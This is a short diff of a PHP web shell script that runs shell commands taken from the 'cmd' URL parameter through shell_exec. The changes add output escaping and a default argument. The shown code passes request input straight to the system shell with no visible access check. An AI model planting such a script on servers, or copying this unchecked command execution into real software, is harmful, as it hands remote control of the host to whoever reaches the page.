@@ -6,7 +6,7 @@ if (empty($_SESSION['path'])) {
     $_SESSION['host'] = shell_exec('hostname');
     $_SESSION['path'] = '~';
 }
-function showInfo($cmd) {
+function showInfo($cmd = NULL) {
     $user = $_SESSION['user'];
     $host = $_SESSION['host'];
     $path = $_SESSION['path'];
@@ -26,8 +26,9 @@ if (!empty($_GET['cmd'])) {
   } else {
     $path = $_SESSION['path'];
       $output = shell_exec("$cmd $path");
+      $output = str_replace(array('>','<'), array('&gt;','&lt'),$output);
       showInfo($cmd);
-      echo "<pre>$output</pre>";
+      echo "<pre>$output</pre> <hr>";
   }
   exit;
 
